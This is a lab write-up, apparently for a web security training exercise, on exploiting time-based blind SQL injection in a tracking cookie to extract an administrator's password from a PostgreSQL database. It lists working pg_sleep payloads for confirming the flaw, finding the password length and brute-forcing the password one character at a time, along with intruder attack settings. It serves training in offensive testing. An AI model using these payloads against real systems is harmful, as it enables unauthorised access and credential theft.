 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. 
However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

Hint:  You can find some useful payloads on our SQL injection cheat sheet. 

End Goal:
- Exploit time-based blind SQLi to output the administrator password
- Log in as the administrator user

Analysis:
---------

1) Confirm that the parameter is vulnerable to SQLi

'||pg_sleep(10)--

2) Confirm that the users table exists in the database

'||(select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--

'||(select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--

3) Enumerate the password length

'||(select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(5) else pg_sleep(-1) end from users)--
- user includer sniper attack to identify the length of password
- password length is 20 character

4) Enumerate the administrator password

'||(select case when (username='administrator' and substring(password, 1, 1)='a') then pg_sleep(5) else pg_sleep(-1) end from users)--
- use includer cluster bomb attack with payload #1 numbers and payload #2 bruteforce then filter with time delay
- change resource pool to 1 thread
